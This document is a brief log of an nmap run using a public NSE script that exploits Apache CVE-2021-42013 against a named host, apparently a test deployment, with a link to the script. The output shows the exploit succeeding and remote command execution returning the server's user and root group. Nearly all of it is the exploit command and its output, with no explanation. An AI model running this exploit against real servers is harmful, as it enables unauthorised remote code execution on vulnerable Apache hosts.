nmap -p80 --script=RCE_CVE2021_42013 --script-args "command=id" asset-cache-frontend.apps.ocp.ralvares.com

https://raw.githubusercontent.com/mauricelambert/CVE-2021-42013/main/RCE_CVE2021_42013.nse


```
nmap -p80 --script=RCE_CVE2021_42013 --script-args "command=id" asset-cache-frontend.apps.ocp.ralvares.com   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 16:56 CEST
NSE: Web service is up. Send payload...
NSE: Mode: exploit RCE
NSE: Target is vulnerable.
NSE: Exploit is working.
Nmap scan report for asset-cache-frontend.apps.ocp.ralvares.com (95.216.68.119)
Host is up (0.045s latency).
rDNS record for 95.216.68.119: static.119.68.216.95.clients.your-server.de

PORT   STATE SERVICE
80/tcp open  http
| RCE_CVE2021_42013: 
|   CVE-2021-42013: 
|     title: Apache CVE-2021-42013 RCE
|     state: VULNERABLE (Exploitable)
|     ids: 
|       CVE:CVE-2021-42013
|     description: 
|       The Apache Web Server contains a RCE vulnerability. This
|       script detects and exploits this vulnerability with RCE
|       attack (execute commands) and local file disclosure.
|     dates: 
|       disclosure: 
|         year: 2021
|         day: 06
|         month: 10
|     disclosure: 2021-10-06
|     refs: 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42013
|       https://github.com/mauricelambert/CVE-2021-42013
|       https://nvd.nist.gov/vuln/detail/CVE-2021-42013
|     exploit output: 
|        
| uid=1000790000(1000790000) gid=0(root) groups=0(root),1000790000
|_

Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds
```